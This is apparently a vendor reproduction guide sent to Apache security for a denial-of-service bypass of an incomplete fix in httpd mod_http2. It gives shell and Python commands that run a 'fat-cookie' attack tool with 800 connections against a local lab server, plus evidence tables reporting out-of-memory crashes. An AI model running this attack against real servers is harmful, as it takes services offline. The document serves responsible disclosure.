# Apache Vendor Reproduction — mod_http2 fat-cookie DoS

**Report:** CVE-2026-49975 incomplete fix  
**Submitted:** 2026-06-17 → security@apache.org

## Prerequisites

- Docker, 8+ GiB RAM for cgroup
- Linux host (tested Ubuntu)

## Steps

```bash
git clone https://github.com/Leviticus-Triage/APEX-Ngin2dos.git
cd APEX-Ngin2dos
./lab-replay-httpd/replay.sh build
./lab-replay-httpd/replay.sh start 8g
./scripts/vendor-repro-apache.sh 800
```

Expected on httpd **2.4.68** / mod_http2 **2.0.41** (default config):

- `connections_bomb_ok` ≈ 800/800
- `wire_mb` ≈ 200–320
- `oom_likely`: true and/or `server_down`: true at 800+ connections

## Alternative (manual)

```bash
cd APEX-Ngin2dos/benchmark
python3 -c "
from attack_config import profile_patch_bypass_httpd_fat
from attack_runner import run_cookie_attack
run_cookie_attack('vendor_repro', '127.0.0.1', 10080, 800,
                  profile_patch_bypass_httpd_fat(800), variant_id='httpd')
"
```

**Note:** Run from `benchmark/` (not repo root) so Python imports resolve without `PYTHONPATH`.

## Contrast (empty-cookie blocked on patch)

```bash
cd benchmark
python3 -c "
from attack_config import profile_apex_cookie_scaled
from attack_runner import run_cookie_attack
r = run_cookie_attack('empty_cookie', '127.0.0.1', 10080, 44,
    profile_apex_cookie_scaled('httpd', 44), variant_id='httpd')
print(r.connections_bomb_ok, r.wire_mb, r.oom_likely)
"
```

## Evidence runs cited in report

| run_id | connections | bomb_ok | wire_mb | oom_likely |
|--------|-------------|---------|---------|------------|
| fa94b7ad | 800 | 800/800 | 319.6 | true |
| d6b2bce1 | 1200 | 879/1200 | 351.2 | true |

JSON: `evidence_fa94b7ad.json`, `evidence_d6b2bce1.json`
